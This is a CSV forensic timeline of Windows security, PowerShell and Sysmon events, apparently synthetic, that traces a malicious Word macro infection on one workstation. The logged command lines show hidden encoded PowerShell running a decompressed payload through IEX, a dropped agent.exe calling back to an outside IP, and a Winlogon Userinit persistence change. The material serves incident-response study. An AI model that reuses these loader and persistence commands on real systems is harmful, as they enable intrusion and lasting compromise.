datetime,timestamp_desc,source,source_long,message,parser,display_name,tag,hostname,username
2024-03-15T07:42:11Z,Content Modification Time,LOG,Microsoft-Windows-Security-Auditing,Event ID: 4688 A new process has been created. Subject: Security ID: CORP\jsmith Account Name: jsmith Account Domain: CORP Logon ID: 0x3A4F21 Process Information: New Process ID: 0x1f84 New Process Name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE Token Elevation Type: TokenElevationTypeDefault (1) Mandatory Label: Medium Mandatory Level Process Command Line: "WINWORD.EXE" /n "C:\Users\jsmith\AppData\Local\Temp\Q1_Budget_Review_2024.docm",evtx,Security.evtx,,WS01,jsmith
2024-03-15T07:42:45Z,Content Modification Time,LOG,Microsoft-Windows-Security-Auditing,Event ID: 4688 A new process has been created. Subject: Security ID: CORP\jsmith Account Name: jsmith Account Domain: CORP Logon ID: 0x3A4F21 Process Information: New Process ID: 0x2044 New Process Name: C:\Windows\SysWOW64\cmd.exe Token Elevation Type: TokenElevationTypeDefault (1) Process Command Line: cmd.exe /c powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBQQA=,evtx,Security.evtx,,WS01,jsmith
2024-03-15T07:42:48Z,Content Modification Time,LOG,Microsoft-Windows-PowerShell/Operational,Event ID: 4104 Script Block Logging: ScriptBlock ID: {a1b2c3d4-e5f6-7890-abcd-ef1234567890} Path: Creating Scriptblock text (1 of 1): $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAEALVXXW+bMBD8K5anSCEYCCEhUt..."));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd() | Invoke-Expression,evtx,Microsoft-Windows-PowerShell/Operational.evtx,,WS01,jsmith
2024-03-15T07:42:51Z,Content Modification Time,LOG,Microsoft-Windows-Security-Auditing,Event ID: 4688 A new process has been created. Subject: Security ID: CORP\jsmith Account Name: jsmith Account Domain: CORP Process Information: New Process ID: 0x2198 New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Token Elevation Type: TokenElevationTypeDefault (1) Process Command Line: powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAo,evtx,Security.evtx,,WS01,jsmith
2024-03-15T07:43:02Z,Content Modification Time,LOG,Microsoft-Windows-Sysmon/Operational,Event ID: 3 Network connection detected. Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe SourceIp: 192.168.10.101 SourcePort: 49876 DestinationIp: 185.220.101.47 DestinationPort: 443 Protocol: tcp Initiated: true,evtx,Microsoft-Windows-Sysmon/Operational.evtx,,WS01,jsmith
2024-03-15T07:43:15Z,Content Modification Time,LOG,Microsoft-Windows-Sysmon/Operational,Event ID: 11 FileCreate: Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe CreationUtcTime: 2024-03-15T07:43:15.000Z,evtx,Microsoft-Windows-Sysmon/Operational.evtx,,WS01,jsmith
2024-03-15T07:43:28Z,Content Modification Time,LOG,Microsoft-Windows-Sysmon/Operational,Event ID: 1 Process Create: Image: C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe CommandLine: agent.exe -c 185.220.101.47 -p 443 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe User: CORP\jsmith Hashes: MD5=6B12A47F0DA6C234D07CB85CB0CE6B90,SHA256=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B,evtx,Microsoft-Windows-Sysmon/Operational.evtx,,WS01,jsmith
2024-03-15T07:43:45Z,Content Modification Time,LOG,Microsoft-Windows-Sysmon/Operational,Event ID: 3 Network connection detected. Image: C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe SourceIp: 192.168.10.101 SourcePort: 50012 DestinationIp: 185.220.101.47 DestinationPort: 443 Protocol: tcp Initiated: true,evtx,Microsoft-Windows-Sysmon/Operational.evtx,,WS01,jsmith
2024-03-15T07:43:50Z,Content Modification Time,LOG,Microsoft-Windows-Security-Auditing,Event ID: 4624 An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 New Logon: Security ID: CORP\jsmith Account Name: jsmith Account Domain: CORP Logon ID: 0x3A5001 Network Information: Workstation Name: WS01 Source Network Address: 192.168.10.101 Source Port: 50013 Authentication Package: NTLM,evtx,Security.evtx,,DC01,jsmith
2024-03-15T07:44:10Z,Content Modification Time,LOG,Microsoft-Windows-Sysmon/Operational,Event ID: 13 Registry value set: Image: C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit Details: C:\Windows\system32\userinit.exe,C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe,evtx,Microsoft-Windows-Sysmon/Operational.evtx,,WS01,jsmith
2024-03-15T07:44:22Z,Content Modification Time,LOG,Microsoft-Windows-Security-Auditing,Event ID: 4657 A registry value was modified. Object: Object Server: Security Object Type: Key Object Name: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon Object Value Name: Userinit Handle ID: 0x48 Operation Type: Existing registry value modified Process Information: Process ID: 0x1e6c Process Name: C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\agent.exe Account Name: jsmith,evtx,Security.evtx,,WS01,jsmith
